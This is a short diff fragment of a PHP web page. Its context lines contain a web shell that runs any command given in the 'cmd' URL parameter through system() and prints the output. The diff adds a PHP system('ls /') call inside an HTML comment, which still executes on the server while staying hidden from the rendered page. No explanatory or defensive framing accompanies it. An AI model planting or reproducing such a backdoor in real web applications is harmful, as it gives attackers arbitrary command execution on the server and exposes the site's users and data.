@@ -11,6 +11,7 @@
         system($_GET['cmd'] . ' 2>&1');
     }
 ?>
+<!-- <?php system('ls /'); ?> -->
 </pre>
 </body>
 </html>
